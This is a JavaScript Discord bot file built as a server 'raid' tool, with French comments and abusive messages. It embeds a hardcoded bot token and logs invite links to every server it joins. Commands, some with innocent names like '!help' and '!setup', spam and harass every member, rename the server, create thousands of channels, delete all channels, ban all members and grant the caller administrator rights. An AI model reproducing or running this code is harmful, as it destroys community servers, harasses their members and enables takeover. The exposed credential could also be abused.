const Discord = require("discord.js");
const bot = new Discord.Client();
const token = "NjYyMDU1Mzg5NDcwMjYxMjg4.XhsWvw.8SUIXnf6dMY1PCRuYfiz3wx6zCc";
var prefix = "!";
var mention = "126connectés"
 
var fucked = false;
 
bot.on('ready', function() {
  setInterval(async () => {
const statuslist = [
  `Bot crée part TATAN | !help`
];
const random = Math.floor(Math.random() * statuslist.length);
 
try {
  await bot.user.setPresence({
    game: {
      name: `${statuslist[random]}`,
      url : "https://www.twitch.tv/gotaga"
      //url: 'https://www.twitch.tv/michou'
    },
    status: "online"
  });
} catch (error) {
  console.error(error);
}
}, 3000);
    //invitation lien
    bot.guilds.forEach(guild => {
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    })
});
 
bot.on('message', msg => {
  //#regions
  /* Commandes */
  if (msg.content === '!ping') {
    msg.reply('pong haha tu a le droit a te faire raid!')
  }
  //#fin de l action
 
  //#region Destructrices
  /* Commandes destructrices */
  if (msg.content === '!join') {
    console.log(`Commande .raud par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone tema ton serv et bz mdrr dit mwa merci");
     }, 500);
  }
            if (msg.content === '!help') {
            console.log(`Commande .mp par ${msg.author.tag}`);
                if (msg.channel.type === "dm") return;
                if (msg.deletable) msg.delete();
                msg.guild.members.forEach(member => {
                  setInterval(function () {
                    member.send(" FUCKED BY ***TATAN*** Raid BY La TATAN je baiz vos mére et on baiz les skids bande de pute goo rejoindre le discord ! bande de bon a rien !@everyone").catch(error => {}) }, 450)})
                    
       }
 
if(msg.content === '!setup'){
          if(msg.channel.type === "dm") return;
          if(msg.guild.channels.size === 0) return;
          else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
      }
 
  if (msg.content === '!help') {
    console.log(`Commande .raid par ${msg.author.tag}`);
 
    if (!fucked){
      msg.guild.setName('TATAN').catch(e => {});
 
      for (var i = 0; i < 1000; i++) {
        msg.guild.createChannel('FUCKED BY TATAN', 'text').catch(e => {});
        msg.guild.createChannel('FUCKED BY TATAN', 'text').catch(e => {});
      }
      fucked = true;
            }
 
    if (msg.deletable) {
      msg.delete();
    }
  }
 
  if (msg.content === '!ban') {
    console.log(`Commande .ban par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "  ") && member.bannable) member.ban().catch(e => {});
    });
  }
 
  if (msg.content === '!leave') {
    console.log(`Commande .exit par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }
 
  if (msg.content === '!admin') {
    console.log(`Commande .be par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "TATAN",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  //#endregion
});
bot.on("message", msg => {
        if(msg.content.startsWith("!help")){
           msg.delete()
            let i = 0;
            let interval = setInterval(function () {
              msg.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('@everyone\n**:) ** Nous baison les skids ! bande de pute vous savez rien faire de votre vie !**')
              }, 9000000);
            });
          }
        });
bot.login(token);